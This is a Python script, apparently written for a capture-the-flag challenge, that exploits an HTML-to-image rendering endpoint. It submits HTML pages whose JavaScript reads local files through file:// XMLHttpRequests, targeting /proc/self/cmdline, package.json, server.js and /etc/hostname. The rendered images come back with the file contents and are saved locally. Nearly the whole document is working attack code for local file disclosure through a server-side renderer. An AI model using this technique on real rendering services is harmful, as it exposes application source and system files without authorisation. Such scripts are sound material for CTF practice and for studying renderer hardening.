import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    data = z.read(n)
                    with open(f'f:/mission-git-hackss/mission-git-hackss/a_{name}.jpg','wb') as f: f.write(data)
                    print(f'{name}: {len(data)} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return
        except Exception: time.sleep(2)
    print(f'{name}: failed')

# XHR read a candidate file, show content OR error
def xhr(path):
    return f'''<!doctype html><html><head><style>body{{font-family:monospace;font-size:18px;white-space:pre-wrap;word-break:break-all;padding:15px}}</style></head><body><div id=o>...</div><script>
var x=new XMLHttpRequest();try{{x.open("GET","file://{path}",false);x.send();document.getElementById("o").textContent=x.status+"|"+(x.responseText||"EMPTY");}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'''

# Node apps: try common entry files + package.json to map the app
for path, name in [
    ('/proc/self/cmdline', 'self_cmdline'),
    ('/app/package.json', 'app_pkg'),
    ('/usr/src/app/package.json', 'usrsrc_pkg'),
    ('/app/server.js', 'app_serverjs'),
    ('/app/index.js', 'app_indexjs'),
    ('/app/app.js', 'app_appjs'),
    ('/etc/hostname', 'hostname'),
]:
    render(xhr(path), name)
    time.sleep(1)
